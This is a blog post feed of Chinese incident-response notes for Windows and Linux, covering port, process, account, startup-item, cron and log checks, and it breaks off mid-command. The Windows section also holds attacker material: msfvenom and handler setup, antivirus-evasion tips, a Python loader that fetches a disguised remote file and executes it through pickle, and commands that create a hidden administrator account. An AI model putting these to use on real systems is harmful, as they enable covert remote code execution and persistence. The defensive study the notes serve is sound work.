{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo • All posts by \"内网\" category",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/05/27/emergency%20response/",
            "url": "http://example.com/2022/05/27/emergency%20response/",
            "title": "应急响应",
            "date_published": "2022-05-27T05:38:45.000Z",
            "content_html": "<h1 id=\"emergency-response\"><a class=\"markdownIt-Anchor\" href=\"#emergency-response\">#</a> emergency response</h1>\n<h2 id=\"入侵排查\"><a class=\"markdownIt-Anchor\" href=\"#入侵排查\">#</a> 入侵排查</h2>\n<h3 id=\"windows\"><a class=\"markdownIt-Anchor\" href=\"#windows\">#</a> Windows</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.生成msf木马</span><br><span class=\"line\">msfvenom -p LHOST LPORT -f</span><br><span class=\"line\"></span><br><span class=\"line\">2.监听</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload </span><br><span class=\"line\">set lohost</span><br><span class=\"line\">set lport</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>msf 中可以在网络链接中找到，但任务管理器找不到</p>\n</blockquote>\n<h4 id=\"端口\"><a class=\"markdownIt-Anchor\" href=\"#端口\">#</a> 端口</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\18310&gt;netstat -ano | findstr &quot;ESTABLISH&quot;</span><br><span class=\"line\">  TCP    10.128.50.84:49893     42.81.179.166:80       ESTABLISHED     25756</span><br><span class=\"line\">  TCP    10.128.50.84:49898     42.81.193.250:443      ESTABLISHED     25756</span><br><span class=\"line\">  TCP    10.128.50.84:49919     103.212.12.39:3000     ESTABLISHED     2208</span><br><span class=\"line\">  TCP    10.128.50.84:57229     119.3.227.186:11113    ESTABLISHED     35024</span><br><span class=\"line\">  TCP    10.128.50.84:57357     113.142.50.195:443     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:57413     119.38.189.36:3504     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:57462     117.62.242.202:80      ESTABLISHED     25756</span><br><span class=\"line\">  TCP    10.128.50.84:57464     120.133.59.142:443     ESTABLISHED     6056</span><br><span class=\"line\">  TCP    10.128.50.84:57474     120.133.59.142:443     ESTABLISHED     6484</span><br><span class=\"line\">  TCP    10.128.50.84:57483     119.38.189.36:3504     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:59370     101.89.15.105:443      ESTABLISHED     33384</span><br><span class=\"line\">  TCP    10.128.50.84:59493     20.198.162.76:443      ESTABLISHED     11804</span><br><span class=\"line\">  TCP    10.128.50.84:59899     150.158.219.208:443    ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:63118     119.38.189.36:3504     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:63177     20.197.71.89:443       ESTABLISHED     11804</span><br></pre></td></tr></table></figure>\n<h4 id=\"进程\"><a class=\"markdownIt-Anchor\" href=\"#进程\">#</a> 进程</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\18310&gt;tasklist /svc | findstr 2208</span><br><span class=\"line\">LenovoInternetSoftwareFra     2208 暂缺</span><br></pre></td></tr></table></figure>\n<p>软件查杀</p>\n<blockquote>\n<p>PCHunter</p>\n<p>分析进程，分析签名，corporation 等</p>\n<p>火绒剑<br>\n process，autorun</p>\n<p>Process Monitor</p>\n</blockquote>\n<p>删除进程</p>\n<blockquote>\n<p>taskkill /F /T /PID 2208</p>\n<p>参数列表:</p>\n<pre><code>/S    system           指定要连接的远程系统。\n\n/U    [domain\\]user    指定应该在哪个用户上下文执行这个命令。\n\n/P    [password]       为提供的用户上下文指定密码。如果忽略，提示\n                       输入。\n\n/FI   filter           应用筛选器以选择一组任务。\n                       允许使用 &quot;*&quot;。例如，映像名称 eq acme*\n\n/PID  processid        指定要终止的进程的 PID。\n                       使用 TaskList 取得 PID。\n\n/IM   imagename        指定要终止的进程的映像名称。通配符 '*'可用来\n                       指定所有任务或映像名称。\n\n/T                     终止指定的进程和由它启用的子进程。\n\n/F                     指定强制终止进程。\n\n/?                     显示帮助消息。\n</code></pre>\n</blockquote>\n<p>找一些小众的 C2 框架，提升过免杀的概率</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTk3NzY3\">https://cloud.tencent.com/developer/article/1597767</span></p>\n<p>CS 上线</p>\n<blockquote>\n<p>netstat 中开始没有 cs 的连接，只有当 cs 中发出命令时才会建立连接，并且服务器发完命令立刻中断连接</p>\n<p>建立连接时间为 sleep</p>\n<p>因为受害者和攻击者通过中间的 teamserver 建立连接</p>\n</blockquote>\n<p>找进程</p>\n<blockquote>\n<p>tasklist  前提是没有注入进程</p>\n<p>注入进程后使用工具</p>\n</blockquote>\n<p>免杀通过 rc4 加密，比 aes 更好</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\">import pickle as json</span><br><span class=\"line\">import ctypes</span><br><span class=\"line\">import urllib.request</span><br><span class=\"line\">import codecs</span><br><span class=\"line\">from Crypto.Cipher import AES</span><br><span class=\"line\"></span><br><span class=\"line\"># pick = &quot;&quot;&quot;</span><br><span class=\"line\"># json.loads(base64.b64decode(AES.new(b&#x27;ysIx0oKueJV15dkA4P3WvDjnq9giB62=&#x27;, AES.MODE_CBC, b&#x27;jbMNXRf954m0WUzQ&#x27;).decrypt(base64.b64decode((b&#x27;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&#x27;</span><br><span class=\"line\"># )))))</span><br><span class=\"line\"># &quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># res = base64.b64decode(AES.new(b&#x27;ysIx0oKueJV15dkA4P3WvDjnq9giB62=&#x27;, AES.MODE_CBC, b&#x27;jbMNXRf954m0WUzQ&#x27;).decrypt(base64.b64decode((b&#x27;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&#x27;</span><br><span class=\"line\"># ))))</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(res)</span><br><span class=\"line\">#</span><br><span class=\"line\"># class A(object):</span><br><span class=\"line\">#     def __reduce__(self):</span><br><span class=\"line\">#         return (exec, (pick,))</span><br><span class=\"line\"># ret = json.dumps(A())</span><br><span class=\"line\"># print(ret)</span><br><span class=\"line\"># res = base64.b64encode(ret)</span><br><span class=\"line\"># print(res)</span><br><span class=\"line\">html=urllib.request.urlopen(&#x27;http://i.miaosu.bid/data/f_41570228.gif&#x27;).read()[7:]</span><br><span class=\"line\">html = html.strip(b&#x27;\\r\\n&#x27;)</span><br><span class=\"line\">res = html[:-3][::-1]+html[-3:]</span><br><span class=\"line\"># print(base64.b64decode(res))</span><br><span class=\"line\">json.loads(base64.b64decode(res))</span><br></pre></td></tr></table></figure>\n<p>在通过 pyinstaller 无窗口编译成为 exe</p>\n<h4 id=\"账户\"><a class=\"markdownIt-Anchor\" href=\"#账户\">#</a> 账户</h4>\n<blockquote>\n<p>首选管理员账户登录，不建议创建账户</p>\n<p>通过 net use 或者 computer mananger 查看用户</p>\n<p>net user haha$ shabi /add      //$ 结尾的用户为影子用户</p>\n<p>net localgroup adminstrators haha$ /add     // 加到管理员组</p>\n<p>此时 net user 看不到，但 computer manager 能看到</p>\n<p>或者通过注册表注册</p>\n<p>先把影子账户和正常账户导出</p>\n<p>通过修改账户的 F 键为想要克隆的键</p>\n<p>导入注册表</p>\n<p>具体自己查吧…</p>\n<p>控制面板和 net user 看不到，但注册表还是可以看到的</p>\n<p>因此在应急响应时查账户要查三个地方</p>\n<p>注册表，控制面板，net user</p>\n<p>或者使用 D 盾</p>\n<p>或者查看日志 eventvwr.msc</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105174751675.png\" alt=\"image-20221105174751675\" style=\"zoom:80%;\" />\n<p>Windows logs -&gt; security</p>\n<p>4624 4625</p>\n</blockquote>\n<h4 id=\"启动项任务计划服务\"><a class=\"markdownIt-Anchor\" href=\"#启动项任务计划服务\">#</a> 启动项，任务计划，服务</h4>\n<blockquote>\n<p>工具可以排查服务和启动项</p>\n<p>任务计划 task scheduler</p>\n<p>注册表启动项</p>\n<p>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\run<br>\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run<br>\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce</p>\n<p>组策略 gpedit.msc 中 自启</p>\n<p>Windows 设置 -&gt; 脚本</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108124205969.png\" alt=\"image-20221108124205969\"></p>\n</blockquote>\n<p>总结:<br>\n 用户 -&gt; 端口 -&gt; 进程 -&gt; 注册表 -&gt; 启动项 -&gt; 任务计划 -&gt; 服务 -&gt; 组策略</p>\n<h3 id=\"linux\"><a class=\"markdownIt-Anchor\" href=\"#linux\">#</a> Linux</h3>\n<h4 id=\"账户-2\"><a class=\"markdownIt-Anchor\" href=\"#账户-2\">#</a> 账户</h4>\n<p>1.passwd</p>\n<p>awk -F:  ‘{print $1,<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>3</mn><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">3,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8388800000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord\">3</span><span class=\"mpunct\">,</span></span></span></span>NF}’  | grep -Ev ‘nologin’</p>\n<p>排查 uid 和 gid , 和 bash</p>\n<p>2.shadow</p>\n<p>shadow 中第二列为！代表不能登录</p>\n<p>能正常登录的用户在第二列会有加密的密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、查询特权用户特权用户(uid 为0)</span><br><span class=\"line\">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class=\"line\">2、查询可以远程登录的帐号信息</span><br><span class=\"line\">[root@localhost ~]# awk &#x27;/\\$1|\\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class=\"line\">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class=\"line\">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">4、禁用或删除多余及可疑的帐号</span><br><span class=\"line\">    usermod -L user    禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头</span><br><span class=\"line\">\tuserdel user       删除 user 用户</span><br><span class=\"line\">\tuserdel -r user    将删除 user 用户，并且将 /home 目录下的 user 目录一并删除</span><br></pre></td></tr></table></figure>\n<p>sudoers 中的内容：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## Allow root to run any commands anywhere </span><br><span class=\"line\">root    ALL=(ALL)       ALL</span><br><span class=\"line\"></span><br><span class=\"line\">## Allows members of the &#x27;sys&#x27; group to run networking, software, </span><br><span class=\"line\">## service management apps and more.</span><br><span class=\"line\"># %sys ALL = NETWORKING, SOFTWARE, SERVICES, STORAGE, DELEGATING, PROCESSES, LOCATE, DRIVERS</span><br><span class=\"line\"></span><br><span class=\"line\">## Allows people in group wheel to run all commands</span><br><span class=\"line\">%wheel  ALL=(ALL)       ALL</span><br><span class=\"line\"></span><br><span class=\"line\">## Same thing without a password</span><br><span class=\"line\"># %wheel        ALL=(ALL)       NOPASSWD: ALL</span><br></pre></td></tr></table></figure>\n<p>因此可能存在 sudo 提权</p>\n<h4 id=\"历史命名\"><a class=\"markdownIt-Anchor\" href=\"#历史命名\">#</a> 历史命名</h4>\n<p>可以查看不同用户的历史命令 ～/.bash_history</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、root 用户的历史命令</span><br><span class=\"line\">histroy</span><br><span class=\"line\">2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。</span><br><span class=\"line\">为历史的命令增加登录的 IP 地址、执行命令时间等信息：</span><br><span class=\"line\">1）保存1万条命令</span><br><span class=\"line\">sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile</span><br><span class=\"line\">2）在/etc/profile的文件尾部添加如下行数配置信息：</span><br><span class=\"line\">######jiagu history xianshi#########</span><br><span class=\"line\">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class=\"line\">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class=\"line\">then</span><br><span class=\"line\">USER_IP=`hostname`</span><br><span class=\"line\">fi</span><br><span class=\"line\">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class=\"line\">shopt -s histappend</span><br><span class=\"line\">export PROMPT_COMMAND=&quot;history -a&quot;</span><br><span class=\"line\">######### jiagu history xianshi ##########</span><br><span class=\"line\">3）source /etc/profile 让配置生效</span><br><span class=\"line\">生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</span><br><span class=\"line\">3、历史操作命令的清除：history -c</span><br><span class=\"line\">但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。</span><br></pre></td></tr></table></figure>\n<h4 id=\"端口-2\"><a class=\"markdownIt-Anchor\" href=\"#端口-2\">#</a> 端口</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -lntup | more</span><br><span class=\"line\">查看下 pid 所对应的进程文件路径，</span><br><span class=\"line\">运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）</span><br><span class=\"line\">如果要排查对应的pid的执行文件</span><br><span class=\"line\">在/proc/$pid/exe</span><br><span class=\"line\"></span><br><span class=\"line\">[root@VM-16-11-centos 6852]# pwd</span><br><span class=\"line\">/proc/6852</span><br><span class=\"line\">[root@VM-16-11-centos 6852]# ls -al</span><br><span class=\"line\">dr-xr-xr-x   9 lighthouse lighthouse 0 Sep 11 14:30 .</span><br><span class=\"line\">dr-xr-xr-x 163 root       root       0 Mar 22  2022 ..</span><br><span class=\"line\">dr-xr-xr-x   2 lighthouse lighthouse 0 Nov  8 17:00 attr</span><br><span class=\"line\">lrwxrwxrwx   1 lighthouse lighthouse 0 Nov  8 17:01 cwd -&gt; /www/wwwroot/www.radsm.co/beef_1/beef</span><br><span class=\"line\">-r--------   1 lighthouse lighthouse 0 Nov  8 17:01 environ</span><br><span class=\"line\">lrwxrwxrwx   1 lighthouse lighthouse 0 Nov  8 17:01 exe -&gt; /home/lighthouse/.rvm/rubies/ruby-3.0.3/bin/ruby</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"进程-2\"><a class=\"markdownIt-Anchor\" href=\"#进程-2\">#</a> 进程</h4>\n<blockquote>\n<p>ps aux | ps ef</p>\n</blockquote>\n<h4 id=\"启动项\"><a class=\"markdownIt-Anchor\" href=\"#启动项\">#</a> 启动项</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/rc.local</span><br></pre></td></tr></table></figure>\n<h4 id=\"任务计划\"><a class=\"markdownIt-Anchor\" href=\"#任务计划\">#</a> 任务计划</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crontab -l   列出某个用户cron服务的详细内容</span><br><span class=\"line\"></span><br><span class=\"line\">重点关注以下目录中是否存在恶意脚本</span><br><span class=\"line\">/var/spool/cron/* </span><br><span class=\"line\">/etc/crontab</span><br><span class=\"line\">/etc/cron.d/*</span><br><span class=\"line\">/etc/cron.daily/* </span><br><span class=\"line\">/etc/cron.hourly/* </span><br><span class=\"line\">/etc/cron.monthly/*</span><br><span class=\"line\">/etc/cron.weekly/</span><br><span class=\"line\">/etc/anacrontab</span><br><span class=\"line\">/var/spool/anacron/*</span><br></pre></td></tr></table></figure>\n<h4 id=\"日志\"><a class=\"markdownIt-Anchor\" href=\"#日志\">#</a> 日志</h4>\n<p>日志默认存放位置：/var/log/</p>\n<p>查看日志配置情况：more /etc/rsyslog.conf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class=\"line\">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | uniq -c | sort -nr | more</span><br><span class=\"line\"></span><br><span class=\"line\">定位有哪些IP在爆破：</span><br><span class=\"line\">grep &quot;Failed password&quot; /var/log/secure|grep -E -o 